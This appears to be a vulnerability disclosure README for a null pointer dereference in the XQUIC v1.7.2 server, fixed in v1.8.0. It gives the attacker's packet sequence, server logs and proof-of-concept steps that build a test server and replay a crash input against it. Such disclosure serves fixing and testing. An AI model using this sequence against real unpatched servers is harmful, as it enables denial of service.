# Bug M6

## Product: XQUIC (Alibaba.inc)
### Github repository: [https://github.com/alibaba/xquic](https://github.com/alibaba/xquic)
### Affected version: [v1.7.2](https://github.com/alibaba/xquic/releases/tag/v1.7.2)
### Fixed version: v1.8.0

### Bug summary:
A Null pointer dereference occurs and XQUIC server crashes, resulting in a Denial of Service attack.

### Bug details: 
The server tries to handle a Stateless Reset packet after the connection has been destroyed.

### Attack vector:
Remote attacker (on path).

### Exploitation 
1) An attack send an Initial packet with CRYPTO frame (Client Hello TLS message) and PADDING frames.
2) Once the server responds with an Initial packet carrying a CRYPTO frame (Server Hello TLS message), the attacker sends an Initial packet with an ACK frame, a NEW_CONNECTION_ID frame (with stateless reset token), a MAX_DATA frame (maximum data=0), a DATA_BLOCKED frame, a STREAM frame and PADDING frames.
3) The server process the ACK frame, NEW_CONNECTION_ID frame (with stateless reset token), MAX_DATA frame (maximum data=0). Because the attacker set the maximum data=0 in MAX_DATA frame, the server detects an error and needs to response back with a correct value. 
    ```
    [frames_processed] |scid:fccd4bae3826d262|xqc_parse_max_data_frame|type:8|max_data:0|
    [info] |scid:fccd4bae3826d262|xqc_process_max_data_frame|max_data too small|max_data:0|max_data_old:34359738368|
    ```
    It tries to send a MAX_DATA frame in a 1-RTT packet and encrypt it. At this point, the handshake is not complete yet. Therefore, it leads to encryption error.

    ```
    [error] |scid:fccd4bae3826d262|xqc_tls_encrypt_payload|crypto not initialized|level:3|
    [error] |scid:fccd4bae3826d262|xqc_packet_encrypt_buf|conn:000055555598DE9C|err:0x1ff|l-127.0.0.1-4433-fccd4bae3826d262 p-127.0.0.1-44683-acd45014b3532c58|
    [error] |scid:fccd4bae3826d262|xqc_packet_encrypt_buf|packet protection error|pkt_type:4|pkt_num:0
    [error] |scid:fccd4bae3826d262|xqc_enc_packet_with_pn|encrypt packet error|
    ```
    Then, the server decides to destroy the connection, which also destroy all the ```path``` in the ```paths_list```.
    ```
    [report] |scid:fccd4bae3826d262|xqc_conn_destroy|000055555598DE9C|has_0rtt:0|0rtt_accept:0|token_ok:0|handshake_time:0|.....
    [debug] |scid:fccd4bae3826d262|xqc_h3_conn_destroy|success|
    ```
4) The attacker continues to send a Stateless Reset packet.
5) The server tries to handle the Stateless Reset packet.
    ```
    [info] |scid:fccd4bae3826d262|xqc_conn_handle_stateless_reset|conn closing, ignore pkt
    ```
    Eventually, the server will reach to ```xqc_engine_main_logic_internal```->```xqc_engine_main_logic```->```xqc_engine_process_conn```->```xqc_conn_timer_expire```->```xqc_timer_expire```. 
    
    At this point, the ```path->path_send_ctl = NULL``` (this was set when ```xqc_conn_destroy```), resulting in a NULL pointer dereference in ```xqc_timer_expire```.


### PoC
Build the xquic test_server as described in the following (assumed you are in same directory as this README.md):
```bash
git clone https://github.com/alibaba/xquic.git
cp xquic_for_developers.patch xquic.crt xquic.key xquic
cd xquic

git clone https://github.com/google/boringssl.git ./third_party/boringssl
cp ../boringssl_for_developers.patch ./third_party/boringssl
cd ./third_party/boringssl
git apply boringssl_for_developers.patch
mkdir -p build && cd build
cmake -DBUILD_SHARED_LIBS=0 -DCMAKE_C_FLAGS="-fPIC" -DCMAKE_CXX_FLAGS="-fPIC" ..
make ssl crypto
cd ..
export SSL_TYPE_STR="boringssl"
export SSL_PATH_STR="${PWD}"
cd ../..
git checkout ae6f7f7
git submodule update --init --recursive
git apply xquic_for_developers.patch
mkdir -p build; cd build
cmake -DGCOV=on -DCMAKE_BUILD_TYPE=Debug -DXQC_ENABLE_TESTING=1 -DXQC_SUPPORT_SENDMMSG_BUILD=1 -DXQC_ENABLE_EVENT_LOG=1 -DXQC_ENABLE_BBR2=1 -DXQC_ENABLE_RENO=1 -DSSL_TYPE=${SSL_TYPE_STR} -DSSL_PATH=${SSL_PATH_STR} ..
make -j
cd ..

# start the server
./build/tests/test_server -a 127.0.0.1 -p 4433
```
Open another terminal, build the program and run with the given crash input (assumed you are in same directory as this README.md):
```bash
cd ..
make
../replay_crash xquic_crash 4433
```